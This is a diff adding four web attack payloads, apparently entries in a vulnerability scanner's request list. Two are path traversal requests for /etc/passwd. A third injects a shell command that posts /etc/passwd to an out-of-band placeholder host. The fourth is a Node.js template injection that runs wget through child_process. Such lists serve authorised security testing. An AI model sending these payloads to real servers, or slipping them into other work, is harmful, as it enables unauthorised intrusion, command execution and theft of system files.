@@ -1,0 +1,4 @@
+/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/static/../../../a/../../../../etc/passwd
+/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20{{interactsh-url}})
+/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://{{interactsh-url}}%27);//
